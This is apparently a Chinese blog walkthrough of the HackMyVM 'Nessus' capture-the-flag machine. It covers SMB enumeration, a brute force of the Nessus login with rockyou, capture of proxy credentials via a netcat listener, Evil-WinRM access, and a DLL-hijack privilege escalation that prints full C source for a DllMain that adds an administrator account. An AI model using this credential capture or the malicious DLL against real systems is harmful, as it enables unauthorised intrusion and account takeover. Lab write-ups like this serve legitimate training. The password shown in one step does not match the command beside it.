---
title: HackMyVM-Nessus
published: 2025-03-09 16:23:40
tags: [HackMyVM]
category: 靶机
draft: false
---

# Nessus.

> https://hackmyvm.eu/machines/machine.php?vm=Nessus
> 

Note: **Just exploit a well known application without a CVE. Hope you enjoy it.**

## 信息收集 & 扫描

```c
nmap -sP 192.168.56.0/24                                
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 01:37 EST
Nmap scan report for 192.168.56.1
Host is up (0.00068s latency).
MAC Address: 0A:00:27:00:00:23 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00036s latency).
MAC Address: 08:00:27:5A:88:BB (Oracle VirtualBox virtual NIC)
Nmap scan report for 
Host is up (0.00080s latency).
MAC Address: 08:00:27:A3:75:F0 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.4
```

```c
nmap -sT -min-rate 10000 -p-                            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 01:37 EST        
Warning:  giving up on port because retransmission cap hit (10).
Nmap scan report for                                                                       
Host is up (0.00024s latency).                                                                           
Not shown: 65001 closed tcp ports (conn-refused), 522 filtered tcp ports (no-response)
PORT      STATE SERVICE                                                                                  
135/tcp   open  msrpc                                                                                    
139/tcp   open  netbios-ssn                                                                              
445/tcp   open  microsoft-ds                                                                             
5985/tcp  open  wsman                                                                                    
8834/tcp  open  nessus-xmlrpc                                                                            
47001/tcp open  winrm                                                                                    
49664/tcp open  unknown                                                                                  
49665/tcp open  unknown                                                                                  
49666/tcp open  unknown
49667/tcp open  unknown                                                                                  
49668/tcp open  unknown                                                                                  
49671/tcp open  unknown                                                                                  
MAC Address: 08:00:27:A3:75:F0 (Oracle VirtualBox virtual NIC
```

```c
nmap -sT -sV -O -p 135,139,445,5958,8834,47001 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 01:39 EST
Nmap scan report for                                                                       
Host is up (0.00052s latency).

PORT      STATE  SERVICE            VERSION
135/tcp   open   msrpc              Microsoft Windows RPC
139/tcp   open   netbios-ssn        Microsoft Windows netbios-ssn                                        
445/tcp   open   microsoft-ds?                                                                           
5958/tcp  closed unknown                                                                                 
8834/tcp  open   ssl/nessus-xmlrpc?                 
47001/tcp open   http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)            
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                  
```

```c
nmap -script=vuln -p 135,139,445,5958,8834,47001 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 01:46 EST
Nmap scan report for 
Host is up (0.00064s latency).

PORT      STATE  SERVICE
135/tcp   open   msrpc
139/tcp   open   netbios-ssn
445/tcp   open   microsoft-ds
5958/tcp  closed unknown
8834/tcp  open   nessus-xmlrpc
47001/tcp open   winrm
MAC Address: 08:00:27:A3:75:F0 (Oracle VirtualBox virtual NIC)

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
```

## WEB渗透

注意到存在一个nessus的监听端口，和靶机是同名的，同时也知道nessus是知名的漏洞扫描软件

访问`8834`端口

![image.png](image%2014.png)

是Nessus的登录页面，尝试使用默认账户密码登录，但是Nessus的默认账号密码是自己设置的

然后注意到存在`445`端口，瞅一眼存在什么东西

```c
smbclient -L 
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Documents       Disk      
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to  failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

都试着访问，最后发现`Documents`文件夹是可以访问的

```c
smbclient ///ADMIN$
Password for [WORKGROUP\root]:
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                                                                                                  
┌──(root㉿kali)-[~]
└─# smbclient ///C$    
Password for [WORKGROUP\root]:
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                                                                                               
┌──(root㉿kali)-[~]
└─# smbclient ///Documents
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Oct 18 20:42:53 2024
  ..                                  D        0  Sat Oct 19 01:08:23 2024
  desktop.ini                       AHS      402  Sat Jun 15 13:54:33 2024
  My Basic Network Scan_hwhm7q.pdf      A   122006  Fri Oct 18 18:19:59 2024
  My Music                        DHSrn        0  Sat Jun 15 13:54:27 2024
  My Pictures                     DHSrn        0  Sat Jun 15 13:54:27 2024
  My Videos                       DHSrn        0  Sat Jun 15 13:54:27 2024
  Web Application Tests_f6jg9t.pdf      A   136025  Fri Oct 18 18:20:14 2024

                12942591 blocks of size 4096. 10996103 blocks available
smb: \> 
```

将文件全都拉取出来

```c
smb: \> mget *
Get file desktop.ini? y
getting file \desktop.ini of size 402 as desktop.ini (8.5 KiloBytes/sec) (average 8.5 KiloBytes/sec)
Get file My Basic Network Scan_hwhm7q.pdf? y
getting file \My Basic Network Scan_hwhm7q.pdf of size 122006 as My Basic Network Scan_hwhm7q.pdf (1588.6 KiloBytes/sec) (average 987.9 KiloBytes/sec)
Get file Web Application Tests_f6jg9t.pdf? y
getting file \Web Application Tests_f6jg9t.pdf of size 136025 as Web Application Tests_f6jg9t.pdf (2711.0 KiloBytes/sec) (average 1484.6 KiloBytes/sec)
```

拉取出来三个文件

```c
desktop.ini  'My Basic Network Scan_hwhm7q.pdf'  'Web Application Tests_f6jg9t.pdf'
```

```c
cat desktop.ini                                                          

[.ShellClassInfo]
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21770
IconResource=%SystemRoot%\system32\imageres.dll,-112
IconFile=%SystemRoot%\system32\shell32.dll
IconIndex=-235
```

其余两个是PDF文件

`My Basic Network Scan_hwhm7q.pdf` 像是扫描记录，不过`Note`给了说不用进行`cve`尝试（其实也灭扫描出来什么）

`Web Application Tests_f6jg9t.pdf` 扫描出来很多个严重的漏洞，但是没看到这个被扫描的程序在哪里

使用`exiftool`来读取文件元信息，在回显的信息中看到`Author`中发现`Jose` 用户，因为是从nessus导出的文件中读取出来的，所以可能是`nessus`的用户

```c
exiftool *
//
Author                          : Jose 
```

那么就可以执行爆破了

网上搜索`nessus`用户名大多是 `admin` ,`root` 我们在基础上再加上作者名`jose`

抓取登录`nusses`的包，然后放到`intruder`进行爆破

![image.png](image%2015.png)

`username`位置我们仅使用`admin root jose` ，`password`我们使用`rockyou`字典

很快我们就获取到一个`200`状态码的包了

![image.png](image%2016.png)

用户名 `jose` 密码 `tequiero` ，尝试登录`nessus` ，登录成功

![image.png](image%2017.png)

进去后在`Proxy Server`中可以知道系统中存在`nesus`用户，但是密码看不见

![image.png](image%2018.png)

发现其中存在`Auth Method`验证方法，我们将其修改为`Basic` ，然后将代理服务器设置为`Kali`的`ip` 

随后`kali`监听

```c
nc -lvp 8080                                                   
listening on [any] 8080 ...
```

点击`nessus`上的`Test Proxy Server` ，随后在`Kali`中可以接收到信息

```c
nc -lvp 8080                          
listening on [any] 8080 ...
: inverse host lookup failed: Unknown host
connect to [192.168.56.4] from (UNKNOWN) [] 49733
CONNECT plugins.nessus.org:443 HTTP/1.1
Proxy-Authorization: Basic bmVzdXM6WiNKdVhIJHBoLTt2QCxYJm1WKQ==
Host: plugins.nessus.org
Connection: keep-Alive
User-Agent: Nessus/10.7.3
Content-Length: 0
Proxy-Connection: Keep-Alive
```

其中的 `Proxy-Authorization: Basic bmVzdXM6WiNKdVhIJHBoLTt2QCxYJm1WKQ==` 非常可疑，看着像是`Base64` 

```c
echo 'bmVzdXM6WiNKdVhIJHBoLTt2QCxYJm1WKQ==' | base64 -d
nesus:Z#JuXH$ph-;v@,X&mV)
```

这密码不知道准不准确…

使用`netexec`来测试`smb` ，密码正确提示已过期？

```c
netexec smb  -u nesus -p 'Z#JuXH$ph-;v@,X&mV)'
SMB           445    NESSUS           [*] Windows Server 2022 Build 20348 x64 (name:NESSUS) (domain:Nessus) (signing:False) (SMBv1:False)
SMB           445    NESSUS           [-] Nessus\nesus:Z#JuXH$ph-;v@,X&mV) STATUS_PASSWORD_EXPIRED 
```

尝试用`wmiexec`执行命令，还是提示密码过期

```c
wmiexec.py nesus:'Z#JuXH$ph-;v@,X&mV)'@
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] SMB SessionError: code: 0xc0000071 - STATUS_PASSWORD_EXPIRED - The user account password has expired.
```

> PS:我之后手动重置了一下密码才能继续，修改密码为`123456`
> 

可以发现不存在 `STATUS_PASSWORD_EXPIRED` 了

```c
netexec smb 192.168.56.8 -u nesus -p Aa118811             
SMB         192.168.56.8    445    NESSUS           [*] Windows Server 2022 Build 20348 x64 (name:NESSUS) (domain:Nessus) (signing:False) (SMBv1:False)
SMB         192.168.56.8    445    NESSUS           [+] Nessus\nesus:123456
```

使用`evil-winrm`获得`shell`

```c
evil-winrm -i 192.168.56.8 -u nesus -p Aa118811             
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nesus\Documents> 
```

## UserFlag

之后可以读取`userflag`了

```c
*Evil-WinRM* PS C:\Users\nesus\Desktop> type user.txt
72113f41d43e88eb5d67f732668bc3d1
```

获取到`user Flag` 接下来就是要获取到`root Flag`了

## DLL 劫持

上传`winpeas`运行一下，显示可能存在`DLL`劫持

```c
[*] DLL HIJACKING in PATHenv variable
   [i] Maybe you can take advantage of modifying/creating some binary in some of the following locations 
   [i] PATH variable entries permissions - place binary or DLL to execute instead of legitimate 
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dll-hijacking
```

翻一下目录（想起来存在nessus）

```c
*Evil-WinRM* PS C:\Program Files\tenable\Nessus> dir

    Directory: C:\Program Files\tenable\Nessus

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/18/2024  10:35 AM              1 .winperms
-a----          5/9/2024  11:30 PM        2471544 fips.dll
-a----          5/9/2024  11:30 PM        5217912 icudt73.dll
-a----          5/9/2024  11:30 PM        1575032 icuuc73.dll
-a----          5/9/2024  11:30 PM        4988536 legacy.dll
-a----          5/9/2024  11:06 PM         375266 License.rtf
-a----          5/9/2024  11:37 PM       11204728 nasl.exe
-a----          5/9/2024  11:31 PM         264824 ndbg.exe
-a----          5/9/2024  11:06 PM             46 Nessus Web Client.url
-a----          5/9/2024  11:33 PM          38520 nessus-service.exe
-a----          5/9/2024  11:37 PM       11143800 nessuscli.exe
-a----          5/9/2024  11:38 PM       11925624 nessusd.exe
```

发现`Nessus`的目录下的文件我们拥有完全权限

可以注意到许多`DLL`文件，并且我们也存在所有权限，所以我们可以尝试`DLL`劫持

首先看`nessus`有哪些可以劫持的DLL，首先我们查看`nessus-service.exe` 引用了哪些`DLL` ，这里选择`VCRUNTIME140.dll`进行尝试

![image.png](image%2019.png)

我们首先创建一个假的`VCRUNTIME140.dll`进行文件进行测试，让`Nessus`不能启动成功

```c
*Evil-WinRM* PS C:\program files\tenable\Nessus> echo "TEST" > VCRUNTIME140.dll
*Evil-WinRM* PS C:\program files\tenable\Nessus> dir
    Directory: C:\program files\tenable\Nessus
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/18/2024  10:35 AM              1 .winperms
-a----          5/9/2024  11:30 PM        2471544 fips.dll
-a----          5/9/2024  11:30 PM        5217912 icudt73.dll
-a----          5/9/2024  11:30 PM        1575032 icuuc73.dll
-a----          5/9/2024  11:30 PM        4988536 legacy.dll
-a----          5/9/2024  11:06 PM         375266 License.rtf
-a----          5/9/2024  11:37 PM       11204728 nasl.exe
-a----          5/9/2024  11:31 PM         264824 ndbg.exe
-a----          5/9/2024  11:06 PM             46 Nessus Web Client.url
-a----          5/9/2024  11:33 PM          38520 nessus-service.exe
-a----          5/9/2024  11:37 PM       11143800 nessuscli.exe
-a----          5/9/2024  11:38 PM       11925624 nessusd.exe
-a----          1/8/2025   3:02 PM             14 VCRUNTIME140.dll
```

重启测试一下`nessus`有没有启动，直接重新扫描一下端口，可以看到`8834`端口没有启动，所以劫持成功了

```c
nmap -sT -min-rate 10000 -p- 192.168.56.8                    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 02:05 EST
Warning: 192.168.56.8 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.56.8
Host is up (0.00052s latency).
Not shown: 65376 closed tcp ports (conn-refused), 148 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
MAC Address: 08:00:27:7A:85:C1 (Oracle VirtualBox virtual NIC)
```

用`C`语言写一个创建`windows`管理员用户的代码（来自作者的`WP`）也可以使用GPT生成

```c
#include <stdlib.h>

#include <windows.h>
 // COMPILE
// x86_64-w64-mingw32-gcc adduser.c --shared -o adduser.dll
BOOL APIENTRY DllMain(
  HANDLE hModule, // Handle to DLL module
  DWORD ul_reason_for_call, // Reason for calling function
  LPVOID lpReserved) // Reserved
{
  switch (ul_reason_for_call) {
	int i;
  case DLL_PROCESS_ATTACH: // A process is loading the DLL.
    i = system("net user sunset sunset /add");
    i = system("net localgroup administrators sunset /add");
    i = system("net localgroup 'remote management' sunset /add");
    i = system("net localgroup 'remote desktop' sunset /add");
    break;
  case DLL_THREAD_ATTACH: // A process is creating a new thread.
    break;
  case DLL_THREAD_DETACH: // A thread exits normally.
    break;
  case DLL_PROCESS_DETACH: // A process unloads the DLL.
    break;
  }
  return TRUE;
}
```

将其编译为`DLL`文件,使用`x86_64-w64-mingw32-gcc.exe` 可以生成64位`windows`的`DLL`文件

```c
PS C:\Program Files\mingw64\bin> .\x86_64-w64-mingw32-gcc.exe .\adduser.c --shared -o adduser.dll -lnetapi32
```

将其上传到靶机，再将名字改为`VCRUNTIME140.dll`

```c
*Evil-WinRM* PS C:\program files\tenable\nessus> upload adduser.dll ./VCRUNTIME140.dll
```

重启检查一下用户是否创建成功，没成功…

随后尝试将劫持的DLL改为`legacy.dll` 

```c
*Evil-WinRM* PS C:\program files\tenable\nessus> mv legacy.dll legacy.dll.bak;mv VCRUNTIME140.dll legacy.dll
```

重启，尝试登录用户，成功登录！！

```c
evil-winrm -i 192.168.56.8 -u sunset -p sunset
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sunset\Documents> 
```

## ROOT Flag

读取`root flag`

```c
*Evil-WinRM* PS C:\Users\administrator\DEsktop> type root.txt
b5fc5a4ebfc20cc18220a814e1aee0aa
```

## 为什么劫持`VCRUNTIME140.dll` 会失败？

可能的

现代操作系统或应用程序可能启用了各种防护机制（如ASLR、SafeDllSearchMode等），这些机制可能会影响DLL的加载
如果使用 `legacy.dll` 成功，可能是因为这个DLL并没有被目标程序明确要求或者它的加载顺序不同于 `VCRUNTIME140.dll`。`legacy.dll` 可能与目标程序的兼容性较高，或者它没有被防护机制所拦截。

可以看到`VCRUNTIME140.dll` 被调用了特定的函数

![image.png](image%2019.png)

如果你的劫持DLL未正确实现这些函数，应用程序在调用时可能会崩溃或拒绝加载你的DLL